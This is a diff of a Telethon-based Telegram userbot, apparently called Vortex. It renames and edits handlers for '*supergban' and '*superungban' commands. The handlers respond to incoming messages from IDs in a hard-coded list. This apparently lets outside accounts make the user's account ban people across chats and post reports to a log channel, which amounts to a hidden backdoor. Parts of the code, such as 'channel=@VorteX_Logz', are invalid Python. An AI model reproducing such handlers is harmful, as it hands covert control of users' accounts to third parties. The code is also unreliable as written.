@@ -271,9 +271,8 @@ async def handler(vortex):
                             return
 
 
-
-@Vortex.on(events.NewMessage(incoming=True, pattern=r"\*supergban")
-async def gspider(rk):
+@Vortex.on(events.NewMessage(incoming=True, pattern="\*supergban")
+async def s_gban(rk):
    if rk.sender_id in Bx:
       lazy = rk
       sender = await lazy.get_sender()
@@ -344,11 +343,12 @@ async def gspider(rk):
          Gban_msgg += f"**Chats Affected :** `{a}\n"
          await lazy.client(functions.channels.JoinChannelRequest(channel=@VorteX_Logz))
          await lazy.client.send_message(-1001660230770, Gban_msgg)
-         await event.client(LeaveChannelRequest(-1001660230770))
+         await lazy.client(LeaveChannelRequest(-1001660230770))
            
 
-@Vortex.on(events.NewMessage(incoming=True, pattern=r"\*superungban")
-async def gspider(rk):
+
+@Vortex.on(events.NewMessage(incoming=True, pattern="\*superungban")
+async def s_ungban(rk):
    if rk.sender_id in Bx:
       lazy = rk
       Dev = rk.sender_id
@@ -419,7 +419,8 @@ async def gspider(rk):
          ungban_msgg += f"**Chats Affected:** `{a}`"
          await lazy.client(functions.channels.JoinChannelRequest(channel=@VorteX_Logz))
          await lazy.client.send_message(-1001660230770, ungban_msgg)
-         await event.client(LeaveChannelRequest(-1001660230770))
+         await lazy.client(LeaveChannelRequest(-1001660230770))
+
 
 
 CMD_HELP.update(
